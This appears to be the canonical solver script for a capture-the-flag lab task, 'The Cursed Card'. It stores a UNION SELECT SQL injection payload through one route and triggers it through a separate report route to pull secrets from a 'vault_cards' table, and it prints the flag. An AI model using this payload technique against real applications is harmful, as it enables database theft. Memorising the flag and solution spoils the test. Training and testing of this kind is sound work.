#!/usr/bin/env bash
# solvers/p3_2.sh, Task 3.2 "The Cursed Card" canonical exploit.
#
# Second-order (stored) SQL injection, in two genuinely separate steps:
#
#   Step 1, POST /p3/cursedcard/inscribe stores a "card inscription" via a
#   properly parameterized INSERT. A raw SQLi payload submitted here is
#   stored verbatim as an inert string: no error, no effect, nothing
#   observable happens at this point. This script asserts exactly that
#   before moving on, this is what makes the bug genuinely second-order
#   rather than a relabeled first-order one.
#
#   Step 2, GET /p3/cursedcard/report is a *separate* route that later
#   reads that already-stored value back out of MariaDB and concatenates it
#   unsafely into a brand-new query. The dormant payload only "wakes up"
#   here, this script never sends the payload to this route directly, it
#   only exercises a route that reads what Step 1 already persisted.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{dormant_until_played}"

PAYLOAD="cursed-inscription' UNION SELECT id, card_name, secret FROM vault_cards-- -"

echo "[p3_2] resetting player_cards to a clean, known state..."
curl -s -o /dev/null "${BASE}/p3/cursedcard/reset"

echo "[p3_2] step 1: POST ${BASE}/p3/cursedcard/inscribe (safe, parameterized storage)"
echo "[p3_2] payload: inscription=${PAYLOAD}"

store_status=$(curl -s -o /tmp/p3_2_store_resp.html -w '%{http_code}' \
    -X POST "${BASE}/p3/cursedcard/inscribe" \
    --data-urlencode "owner=solver" \
    --data-urlencode "inscription=${PAYLOAD}")
store_resp=$(cat /tmp/p3_2_store_resp.html)

if [ "$store_status" != "200" ]; then
    echo "[p3_2] FAIL: storage route returned HTTP ${store_status} (expected 200, a"
    echo "  parameterized insert of this payload must never error)"
    echo "$store_resp"
    echo "[p3_2] FAIL"
    exit 1
fi
echo "  ok: storage route returned HTTP 200"

if echo "$store_resp" | grep -qF "$FLAG"; then
    echo "[p3_2] FAIL: flag appeared immediately at storage time, that would make"
    echo "  this a relabeled first-order bug, not second-order. Storing the"
    echo "  payload must have zero immediate effect."
    echo "[p3_2] FAIL"
    exit 1
fi
echo "  ok: storing the payload had no immediate effect (no flag in the response)"

echo "[p3_2] step 2: GET ${BASE}/p3/cursedcard/report (reads the stored value back,"
echo "  concatenates it unsafely into a new query, no payload sent directly here)"

report_resp=$(curl -s "${BASE}/p3/cursedcard/report")

if echo "$report_resp" | grep -qF "$FLAG"; then
    echo "[p3_2] ok: dormant payload woke up on the later read, flag recovered: ${FLAG}"
    echo "[p3_2] PASS"
    exit 0
else
    echo "[p3_2] FAIL: flag did not appear in the appraiser report"
    echo "---- report response body ----"
    echo "$report_resp"
    echo "-------------------------------"
    echo "[p3_2] FAIL"
    exit 1
fi
